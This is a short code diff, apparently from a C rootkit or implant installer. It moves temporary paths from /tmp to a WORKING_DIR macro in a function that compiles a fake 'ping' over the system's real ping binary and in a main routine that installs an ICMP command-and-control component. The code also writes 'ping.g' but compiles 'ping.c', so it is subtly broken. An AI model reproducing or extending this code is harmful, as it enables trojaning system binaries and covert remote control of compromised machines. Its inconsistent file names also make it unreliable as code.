@@ -324,15 +324,15 @@ int re_fake_ping(void){
     FILE *fp;
     
     // Create ping.c
-    fp = fopen("/tmp/ping.g", "w+");
+    fp = fopen(WORKING_DIR "/ping.g", "w+");
     fprintf(fp, "%s", fake_ping_c);
     fclose(fp);
 
     // Replace ping
-    system("gcc /tmp/ping.c -o `which ping`");
+    system("gcc " WORKING_DIR "/ping.c -o `which ping`");
 
     // Remove temporary file
-    system("rm /tmp/ping.c");
+    system("rm " WORKING_DIR "/ping.c");
     return 0;
 }
 
@@ -719,7 +719,7 @@ int main(int argc, char **argv){
     if(INSTALL & ICMPK_ID && re_icmp_c2())
         failures |= ICMPK_ID;
 
-    // Empty /tmp
+    // Empty WORKING_DIR
     dr = opendir(WORKING_DIR);
     if (dr == NULL) { 
         perror("opendir"); 
